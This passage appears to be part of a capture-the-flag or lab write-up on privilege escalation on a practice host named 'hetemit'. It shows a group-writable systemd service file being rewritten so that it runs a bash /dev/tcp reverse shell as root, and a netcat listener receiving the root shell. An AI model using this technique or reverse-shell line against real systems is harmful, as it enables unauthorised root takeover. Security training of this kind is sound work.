# 9 privesc > root

Write permission on `/etc/systemd/python` service > root

```
[cmeeks@hetemit k]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

[cmeeks@hetemit k]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
[cmeeks@hetemit k]$ ls -la /etc/systemd/system/pythonapp.service
-rw-rw-r-- 1 root cmeeks 302 Nov 13  2020 /etc/systemd/system/pythonapp.service

# modify file
# IMPORTANT to update User as thats the user the service will execute the ExecStart command with
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.195/18000 0>&1'
User=root

$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.49.195] from (UNKNOWN) [192.168.195.117] 39472
bash: cannot set terminal process group (1209): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit restjson_hetemit]# whoami;id;hostname;uname -a
whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
hetemit
Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
